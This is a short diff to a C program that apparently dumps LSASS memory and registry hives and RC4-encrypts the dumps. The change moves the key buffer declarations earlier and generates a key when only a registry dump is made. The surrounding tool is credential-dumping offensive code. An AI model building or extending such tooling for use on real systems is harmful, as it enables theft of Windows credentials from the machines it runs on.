@@ -181,6 +181,8 @@ int main(int argc, char* argv[]) {
 				dwSystemSize = NULL;
 	INT			lsassDumpRetryCount = 0;
 
+	CHAR	rc4Key[RC4KEYSIZE], encRc4Key[RC4KEYSIZE];
+
 	ParsedArgs	args = ParseArgs(argc, argv);
 
 	INT standardDelay,
@@ -371,6 +373,9 @@ LsassDumpRetry:
 #endif // RETRY_DUMP_ON_FAILURE
 
 		if (args.regDump) {
+			// Generate key for reg encryption when no LSASS dump is created
+			GenerateRandomBytes(rc4Key, RC4KEYSIZE);
+			memcpy(encRc4Key, rc4Key, RC4KEYSIZE);
 			goto RegDump;
 		}
 		else {
@@ -387,8 +392,6 @@ LsassDumpRetry:
 		printf("[-] Unable to Read LSASS Dump");
 		goto ErrorCleanUp;
 	}
-
-	CHAR	rc4Key[RC4KEYSIZE], encRc4Key[RC4KEYSIZE];
 
 	GenerateRandomBytes(rc4Key, RC4KEYSIZE);
 
